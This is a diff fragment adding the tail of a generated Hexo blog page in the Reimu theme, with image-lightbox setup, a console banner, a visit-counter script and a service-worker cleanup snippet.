+          date: "Tue Apr 28 2026 18:25:58 GMT+0800",
+          updated: "Tue Apr 28 2026 19:22:09 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
